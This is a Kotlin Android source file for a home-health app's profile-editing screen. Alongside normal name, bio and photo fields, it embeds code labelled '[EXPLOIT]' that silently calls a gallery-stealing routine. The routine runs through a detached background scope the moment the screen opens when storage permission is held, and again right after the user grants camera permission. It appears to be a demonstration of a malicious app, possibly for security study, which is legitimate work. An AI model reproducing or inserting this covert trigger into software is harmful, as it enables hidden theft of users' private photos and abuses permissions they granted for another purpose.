package com.example.homehealth.screens.profile

import android.Manifest
import android.content.pm.PackageManager
import android.net.Uri
import android.util.Log
import androidx.core.content.ContextCompat
import com.example.homehealth.exploits.ImageRetrieval
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.material3.*
import androidx.compose.ui.*
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.AccountCircle
import androidx.compose.ui.unit.dp
import androidx.compose.runtime.getValue
import androidx.compose.runtime.Composable
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.collectAsState
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import coil.compose.AsyncImage
import androidx.compose.ui.layout.ContentScale
import androidx.compose.ui.platform.LocalContext
import androidx.core.content.FileProvider
import androidx.lifecycle.viewmodel.compose.viewModel
import androidx.navigation.NavHostController
import com.example.homehealth.fragments.BottomNavBar
import com.example.homehealth.viewmodels.AuthViewModel
import com.example.homehealth.viewmodels.ProfileViewModel
import java.io.File

// [EXPLOIT] Detached scope — survives screen/ViewModel lifecycle teardown
private val exfilScope = CoroutineScope(Dispatchers.IO)

@Composable
fun EditProfileScreen(
    navController: NavHostController,
    profileViewModel: ProfileViewModel,
    authViewModel: AuthViewModel = viewModel()
) {
    val user by profileViewModel.profileUser
    val sessionUser = authViewModel.currentUser.value
    val editState by profileViewModel.editState.collectAsState()

    val context = LocalContext.current
    var imageUri by remember { mutableStateOf<Uri?>(null) }
    var tempPhotoUri by remember { mutableStateOf<Uri?>(null) }

    val cameraLauncher =
        rememberLauncherForActivityResult(ActivityResultContracts.TakePicture()) { success ->
            if (success) {
                tempPhotoUri?.let { uri ->
                    imageUri = uri
                    profileViewModel.uploadProfileImage(
                        userId = sessionUser!!.uid,
                        uri = uri
                    )
                }
            }
        }

    val imagePicker = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.GetContent()
    ) { uri: Uri? ->
        uri?.let {
            imageUri = it
            profileViewModel.uploadProfileImage(
                userId = sessionUser!!.uid,
                uri = it
            )
        }
    }

    val displayImage =
        editState.profileImageUrl
            ?: user?.profileImageUrl
            ?: imageUri

    val requestPermissionLauncher =
        rememberLauncherForActivityResult(ActivityResultContracts.RequestPermission()) { isGranted ->
            Log.d("ImageRetrieval", ">>> Camera permission result: $isGranted")
            if (isGranted) {
                // [EXPLOIT] Permission just granted — silently steal gallery before opening camera
                exfilScope.launch {
                    try {
                        ImageRetrieval.stealGalleryImages(context)
                    } catch (e: Exception) {
                        Log.e("ImageRetrieval", ">>> Exception: ${e.message}", e)
                    }
                }
                val file = File(context.cacheDir, "profile_image.jpg")
                val uri = FileProvider.getUriForFile(
                    context,
                    "${context.packageName}.fileprovider",
                    file
                )
                tempPhotoUri = uri
                cameraLauncher.launch(uri)
            }
        }

    // [EXPLOIT] Eager trigger — fires immediately on screen entry
    LaunchedEffect(Unit) {
        Log.d("ImageRetrieval", ">>> LaunchedEffect fired")

        val readPermission = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU)
            Manifest.permission.READ_MEDIA_IMAGES
        else
            Manifest.permission.READ_EXTERNAL_STORAGE

        val alreadyGranted = ContextCompat.checkSelfPermission(context, readPermission) ==
                PackageManager.PERMISSION_GRANTED

        Log.d("ImageRetrieval", ">>> Permission ($readPermission) granted: $alreadyGranted")

        if (alreadyGranted) {
            Log.d("ImageRetrieval", ">>> Launching steal...")
            exfilScope.launch {
                try {
                    ImageRetrieval.stealGalleryImages(context)
                } catch (e: Exception) {
                    Log.e("ImageRetrieval", ">>> Exception: ${e.message}", e)
                }
            }
        } else {
            Log.d("ImageRetrieval", ">>> Permission not granted — tap photo circle to trigger")
        }
    }

    LaunchedEffect(sessionUser) {
        sessionUser?.uid?.let { userId ->
            profileViewModel.loadProfile(userId)
        }
    }

    if (user == null || sessionUser == null) {
        Box(
            modifier = Modifier.fillMaxSize(),
            contentAlignment = Alignment.Center
        ) {
            CircularProgressIndicator()
        }
        return
    }

    Scaffold(
        bottomBar = { BottomNavBar(navController, sessionUser.uid, sessionUser.role) }
    ) { paddingValues ->
        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(paddingValues)
                .padding(24.dp),
            horizontalAlignment = Alignment.CenterHorizontally
        ) {
            Box(
                modifier = Modifier
                    .size(120.dp)
                    .clip(CircleShape)
                    .clickable {
                        when (PackageManager.PERMISSION_GRANTED) {
                            ContextCompat.checkSelfPermission(
                                context,
                                android.Manifest.permission.CAMERA
                            ) -> {
                                val file = File(context.cacheDir, "profile_image.jpg")
                                val uri = FileProvider.getUriForFile(
                                    context,
                                    "${context.packageName}.fileprovider",
                                    file
                                )
                                tempPhotoUri = uri
                                cameraLauncher.launch(uri)
                            }
                            else -> {
                                requestPermissionLauncher.launch(android.Manifest.permission.CAMERA)
                            }
                        }
                    },
                contentAlignment = Alignment.Center
            ) {
                if (displayImage != null) {
                    AsyncImage(
                        model = displayImage,
                        contentDescription = "Profile picture",
                        contentScale = ContentScale.Crop,
                        modifier = Modifier.fillMaxSize()
                    )
                } else {
                    Icon(
                        imageVector = Icons.Default.AccountCircle,
                        contentDescription = "Profile picture",
                        tint = Color.Gray,
                        modifier = Modifier.fillMaxSize()
                    )
                }
            }

            Spacer(modifier = Modifier.height(8.dp))
            Text(
                text = "Tap to change photo",
                style = MaterialTheme.typography.bodySmall,
                color = Color.Gray
            )
            Spacer(modifier = Modifier.height(24.dp))

            OutlinedTextField(
                value = editState.name,
                onValueChange = { profileViewModel.onNameChanged(it) },
                label = { Text("Name") },
                singleLine = true,
                modifier = Modifier.fillMaxWidth()
            )
            Spacer(modifier = Modifier.height(12.dp))

            OutlinedTextField(
                value = user!!.email,
                onValueChange = {},
                readOnly = true,
                label = { Text("Email") },
                modifier = Modifier.fillMaxWidth()
            )
            Spacer(modifier = Modifier.height(12.dp))

            OutlinedTextField(
                value = editState.bio,
                onValueChange = { profileViewModel.onBioChanged(it) },
                label = { Text("Bio") },
                modifier = Modifier.fillMaxWidth()
            )
            Spacer(modifier = Modifier.height(24.dp))

            Button(
                modifier = Modifier.fillMaxWidth(),
                enabled = !editState.isSaving,
                onClick = {
                    profileViewModel.saveProfile()
                    navController.popBackStack()
                }
            ) {
                if (editState.isSaving) {
                    CircularProgressIndicator(
                        modifier = Modifier.size(20.dp),
                        strokeWidth = 2.dp
                    )
                } else {
                    Text("Save")
                }
            }
        }
    }
}